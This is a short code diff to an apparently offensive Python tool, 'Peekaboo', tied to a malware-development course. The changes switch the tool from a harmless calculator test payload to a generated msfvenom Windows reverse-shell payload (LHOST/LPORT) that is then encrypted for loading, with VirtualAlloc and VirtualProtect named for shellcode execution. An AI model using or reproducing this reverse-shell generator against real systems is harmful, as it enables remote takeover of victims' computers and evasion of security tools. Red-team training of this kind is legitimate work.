@@ -53,7 +53,7 @@ class PeekabooEncryptor():
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
-    msfv = "msfvenom -p windows/x64/meterpreter_reverse_tcp"
+    msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
     msfv += " LHOST=" + host
     msfv += " LPORT=" + port
     msfv += " -f raw"
@@ -79,11 +79,10 @@ def run_peekaboo(host, port):
     https://institute.sektor7.net/red-team-operator-malware-development-essentials
     """
     print (Colors.BLUE + banner + Colors.ENDC)
-    # generate_payload(host, port)
+    generate_payload(host, port)
     encryptor = PeekabooEncryptor()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
-    # plaintext = open("/tmp/hack.bin", "rb").read()
-    plaintext = open("./calc.bin", "rb").read()
+    plaintext = open("/tmp/hack.bin", "rb").read()
 
     f_va = "VirtualAlloc"
     f_vp = "VirtualProtect"
